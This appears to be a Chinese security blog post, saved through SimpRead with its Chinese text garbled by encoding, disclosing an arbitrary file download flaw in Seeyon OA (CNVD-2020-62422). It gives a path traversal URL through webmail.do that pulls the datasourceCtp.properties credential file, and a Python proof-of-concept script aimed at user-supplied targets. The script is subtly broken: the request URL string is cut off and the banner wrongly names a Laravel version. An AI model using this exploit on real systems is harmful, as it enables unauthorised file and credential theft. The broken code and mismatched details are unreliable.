<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/IHISaQzNGx9fUElERGZHMQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**ä¸€****ï¼šæ¼æ´æè¿°ğŸ‘**

è‡´è¿œ OA å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´ä¸‹è½½ä»»æ„æ–‡ä»¶ï¼Œè·å–æ•æ„Ÿä¿¡æ¯

**äºŒ:Â  æ¼æ´å½±å“ğŸ‡**

è‡´è¿œ OA A6-V5

è‡´è¿œ OA A8-V5

è‡´è¿œ OA G6

**ä¸‰:Â  æ¼æ´å¤ç°ğŸ‹**

è®¿é—® url Â http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties

å­˜åœ¨æ¼æ´çš„ OA ç³»ç»Ÿå°†ä¼šä¸‹è½½ **datasourceCtp.properties** é…ç½®æ–‡ä»¶

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7sNA2oibfrEvLCia4dI2NZLL60769l4OlY9ydJw25wmqZP9Lds9GzIvE2yDZTbOsiagDjY6rViaKUJCQ/640?wx_fmt=png)

æ›´æ”¹å‚æ•° filePath å¯ä¸‹è½½å…¶ä»–æ–‡ä»¶

 **å››:Â  æ¼æ´åˆ©ç”¨ POCğŸ‹**

```
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: Laravel framework <= 5.5.21                              \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/seeyon/webmail.do?method=doDownloadAtt&file
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "workflow" in response.text:
            print("\033[32m[o] ç›®æ ‡{}å­˜åœ¨æ¼æ´ \033[0m".format(target_url))
            print("\033[32m[o] å“åº”ä¸º:\n{} \033[0m".format(response.text))
        else:
            print("\033[31m[x] æ–‡ä»¶è¯·æ±‚å¤±è´¥ \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7sNA2oibfrEvLCia4dI2NZLL9AsB5L6KluvInGeQz2gmQIiaAgwmCSuEAjaIyMzDYD5WekJFrC1ibavw/640?wx_fmt=png)

Goby & POC
----------

```
GObyÂ POCÂ ç›®å½•å·²ç»æ·»åŠ æ¼æ´jsonæ–‡ä»¶ï¼Œå¯ä»¥ä¸€é”®å¯¼å…¥
è‡´è¿œOA webmail.doä»»æ„æ–‡ä»¶ä¸‹è½½ CNVD-2020-62422
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7sNA2oibfrEvLCia4dI2NZLL9zzXadyzMOOxueB7KeOLq9wmjsJX7ShiavJib51FLx8v7VeAYwt70Y8g/640?wx_fmt=png)

æœ€å
--

> ä¸‹é¢å°±æ˜¯æ–‡åº“å’Œå›¢é˜Ÿçš„å…¬ä¼—å·å•¦ï¼Œæ›´æ–°çš„æ–‡ç« éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨å…¬ä¼—å·
> 
> åˆ«å¿˜äº† Github ä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro75IHato7k7WJakCwObVtic8kOiagRSTylHIhHxg4DVKOhBFDazKkCMgvw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro7uWKGayI2RguaLia8VfTDystgmyZaEk15WcXU9v4WtULgysUGicYFGMQA/640?wx_fmt=png)